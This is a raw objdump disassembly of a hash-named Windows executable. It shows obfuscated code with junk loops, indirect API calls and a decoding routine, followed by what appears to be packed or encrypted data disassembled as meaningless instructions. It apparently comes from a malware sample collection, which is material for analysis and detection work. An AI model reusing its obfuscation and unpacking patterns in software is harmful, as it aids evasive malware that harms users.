
9d68b5bbf43fec60309afcaec52f664b2c7018604d3e893da592fee947a8107a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	stos   BYTE PTR es:[edi],al
  40190d:	pop    edi
  40190e:	mov    edi,0x6262621d
  401913:	bound  ebx,QWORD PTR [edx]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b4
  401922:	jbe    0x40199a
  401924:	retf   
  401925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xa8b7bbf1
  4019bd:	jmp    FWORD PTR ds:0xf253c49c
  4019c3:	adc    esi,DWORD PTR es:[ebx-0x3d]
  4019c7:	hlt    
  4019c8:	add    ebp,DWORD PTR [ebp+0x7c88f71a]
  4019ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019cf:	pop    ss
  4019d0:	mov    al,0x65
  4019d2:	or     esi,eax
  4019d4:	adc    eax,0xdf6c7b17
  4019d9:	fmul   DWORD PTR [ecx-0x4c46ea6f]
  4019df:	push   ecx
  4019e0:	in     eax,0xa3
  4019e2:	call   0xab28:0xcbc08161
  4019e9:	push   0xffffffd2
  4019eb:	mov    BYTE PTR [esi],0xc2
  4019ee:	xor    eax,0x37fe4431
  4019f3:	mov    ds:0x10f8924c,eax
  4019f8:	pop    esp
  4019f9:	push   eax
  4019fa:	ja     0x401a38
  4019fc:	cvtps2pi mm3,QWORD PTR [ebp+0x2375019]
  401a03:	prefetch BYTE PTR ds:0x7575c555
  401a0a:	mov    ah,0x35
  401a0c:	out    0xa2,al
  401a0e:	cmp    ah,BYTE PTR [edi+eax*1-0x35fb580f]
  401a15:	dec    ebp
  401a16:	or     DWORD PTR [ebx-0x1e],ebx
  401a19:	stos   BYTE PTR es:[edi],al
  401a1a:	xchg   esi,eax
  401a1b:	cmc    
  401a1c:	out    dx,eax
  401a1d:	shl    BYTE PTR [edi],1
  401a1f:	pop    ecx
  401a20:	cmp    ah,ch
  401a22:	lock mov dl,0xea
  401a25:	into   
  401a26:	lods   al,BYTE PTR ds:[esi]
  401a27:	aad    0x71
  401a29:	ror    DWORD PTR [ebx+ecx*2],0xcd
  401a2d:	and    DWORD PTR [esi-0x76f2060f],0xffffffd0
  401a34:	mov    DWORD PTR [ebx+0x36],0x507da746
  401a3b:	xor    ah,BYTE PTR [esi+0x3553e23e]
  401a41:	loop   0x401a65
  401a43:	cwde   
  401a44:	mov    WORD PTR [edi+0x55],?
  401a47:	jo     0x401a38
  401a49:	push   edi
  401a4a:	dec    ecx
  401a4b:	push   ecx
  401a4c:	scas   al,BYTE PTR es:[edi]
  401a4d:	adc    eax,0xba2e5f14
  401a52:	mul    DWORD PTR [ecx-0x18]
  401a55:	dec    ebp
  401a56:	dec    edx
  401a57:	jg     0x401a73
  401a59:	sub    esp,DWORD PTR [eax]
  401a5b:	(bad)  
  401a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a5e:	es mov al,0x56
  401a61:	loope  0x401a55
  401a63:	cld    
  401a64:	sbb    edx,DWORD PTR ds:0x26161998
  401a6a:	sbb    eax,0x5be645e
  401a6f:	sbb    eax,0x54db2966
  401a74:	mov    al,0xbd
  401a76:	popa   
  401a77:	xor    eax,0xdbd069b6
  401a7c:	cmp    eax,0x63455bd3
  401a81:	sub    eax,0x77596973
  401a86:	std    
  401a87:	cmp    bl,BYTE PTR [ecx]
  401a89:	sahf   
  401a8a:	sub    al,0x34
  401a8c:	mov    BYTE PTR [ebp-0x69185b8d],cl
  401a92:	sub    dl,BYTE PTR ds:0xa0ab557c
  401a98:	pusha  
  401a99:	mov    dl,0xce
  401a9b:	xor    BYTE PTR [edi-0x76],dh
  401a9e:	fdiv   QWORD PTR [ecx]
  401aa0:	adc    dh,BYTE PTR [edx-0x14]
  401aa3:	cmp    al,BYTE PTR [ecx-0x62d668c6]
  401aa9:	stos   DWORD PTR es:[edi],eax
  401aaa:	ja     0x401b0c
  401aac:	xor    eax,0x69c68520
  401ab1:	mov    ebp,0xb35894aa
  401ab6:	clc    
